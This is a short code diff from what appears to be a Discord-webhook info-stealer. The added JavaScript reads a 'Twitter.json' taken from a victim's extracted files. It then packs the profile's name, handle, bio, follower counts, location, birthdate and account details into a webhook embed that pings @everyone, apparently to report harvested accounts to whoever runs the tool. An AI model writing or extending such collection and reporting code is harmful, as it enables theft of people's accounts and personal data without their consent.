@@ -133,6 +133,32 @@ const json = async (zipFile) => {
     });
   }
 
+  if (fs.existsSync(join(tempFolder, 'Twitter.json'))) {
+    const profile = JSON.parse(fs.readFileSync(join(tempFolder, 'Twitter.json')).toString());
+
+    embeds.push({
+      author: {
+        name: `${profile.name} (@${profile.screen_name})`,
+        icon_url: profile.profile_image_url_https,
+        url: `https://twitter.com/${profile.screen_name}`
+      },
+      fields: [
+        ['Bio', profile.description.replaceAll(/@(\w{1,15})/gi, '[@$1](https://twitter.com/$1)')],
+        ['Followers', profile.followers_count],
+        ['Following', profile.friends_count],
+        ['Tweets', profile.statuses_count],
+        ['Location', profile.location || 'No location set'],
+        ['URL', profile.url || 'No URL set'],
+        ['Birthday date', `${profile.extended_profile.birthdate.day}/${profile.extended_profile.birthdate.month}/${profile.extended_profile.birthdate.year}`],
+        ['Account created', `<t:${Math.floor(new Date(profile.created_at).getTime() / 1000)}>`],
+        ['Verified?', profile.verified]
+      ].map(f => ({ name: f[0], value: f[1], inline: true })),
+      thumbnail: {
+        url: profile.profile_image_url_https
+      }
+    });
+  }
+
   return {
     content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
     attachments: [{
